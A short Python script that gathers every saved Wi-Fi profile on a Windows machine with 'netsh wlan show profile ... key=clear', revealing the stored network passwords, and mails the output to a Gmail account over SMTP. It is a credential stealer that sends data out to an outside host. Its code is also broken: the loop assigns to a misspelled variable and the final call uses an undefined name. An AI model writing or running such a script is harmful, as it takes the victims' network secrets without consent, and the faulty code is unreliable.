#!/usr/bin/env python3.11

import subprocess
import smtplib
import re
from subprocess import check_output
from re import findall
import smtplib


def Execution() -> str:
    NICs = check_output("netsh wlan show profile", shell=True, text=True)
    NICs_names = findall(pattern="(?:Profile\s*:\s)(.*)", string=NICs)
    return NICs_names


def Server(msg: str) -> None:
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(user="Email@gmail.com", password="YouGmail-AppPassword")
    server.sendmail(
        from_addr="Email@gmail.com", to_addrs="Email@gmail.com", msg=msg
    )
    server.quit()


NICs_names = Execution()
all_nics_information_email: str = ""
for nic in NICs_names:
    process = check_output(
        f"netsh wlan show profile {nic} key=clear", shell=True, text=True
    )
    all_nics_information_e = all_nics_information_email + process

Server(msg=All_NICs_Information)
